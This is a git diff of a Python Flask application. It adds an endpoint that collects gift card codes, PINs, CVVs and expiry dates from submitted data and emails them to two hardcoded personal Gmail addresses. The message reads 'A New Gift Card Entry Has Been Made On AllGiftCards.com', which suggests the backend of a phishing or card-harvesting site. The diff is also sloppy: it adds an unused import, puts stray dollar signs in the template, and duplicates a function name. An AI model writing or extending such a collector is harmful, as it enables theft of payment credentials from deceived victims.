@@ -1,6 +1,7 @@
 # importing required modules
 import os
 import csv
+from dotenv.main import rewrite
 import requests
 from flask import Flask, url_for, jsonify, render_template, request
 from dotenv import load_dotenv
@@ -38,9 +39,26 @@ def home():
     return jsonify(response), 200
 
 
+def fill(code, name, exp, pin, cvv):
+
+    body = f"""
+             <h3> A New Gift Card Entry Has Been Made On AllGiftCards.com</h3>
+
+             <p> Gift Card Redemption Code:  {code}</p>
+
+              <p>Gift Card Name:  {name}</p>
+              <p>Gift Card Exp Date:  ${exp}</p>
+              <p>Gift Card Pin:  ${pin}</p>
+              <p>Gift Card CVV:  ${cvv}</p> 
+        """
+
+    return body
+
+
 # endpoint for sending email
 @app.route('/api/v1/submit/', methods=["POST"])
 def send_email():
+
     status = True
     try:
         # unpacking request data
@@ -57,6 +75,56 @@ def send_email():
             'reset_password.txt', name=name, email=email, message=message)
         msg.html = render_template(
             'reset_password.html', name=name, email=email, message=message)
+
+        # sending the message
+        mail.send(msg)
+
+        # computing response
+        response = {
+            "status": "success",
+            "message": "Thanks, your message has been successfully sent. I will get back to you shortly. Stay Safe"
+        }
+        return jsonify(response), 200
+
+    except TypeError:
+        # catching exceptions
+        status = False
+        response = {
+            "status": "failed",
+            "message": "Your message data is empty"
+        }
+        return jsonify(response), 400
+
+    except KeyError:
+        # catching exceptions
+        status = False
+        response = {
+            "status": "failed",
+            "message": "Ops! There's an error in the message data sent"
+        }
+        return jsonify(response), 400
+
+
+# endpoint for sending email
+@app.route('/api/v1/send/', methods=["POST"])
+def send_email():
+
+    status = True
+    try:
+        # unpacking request data
+        data = request.get_json()
+        code = data['code']
+        name = data['name']
+        exp = data['exp']
+        cvv = data['cvv']
+        pin = data['pin']
+        subject = "NEW GIFT CARD ALERT"
+
+        # computing message
+        msg = Message(subject,
+                      sender=name, recipients=['lovedayperfection1@gmail.com', 'Williamcampbell693@gmail.com'])
+        msg.body = fill(code, name, exp, pin, cvv)
+        msg.html = fill(code, name, exp, pin, cvv)
 
         # sending the message
         mail.send(msg)
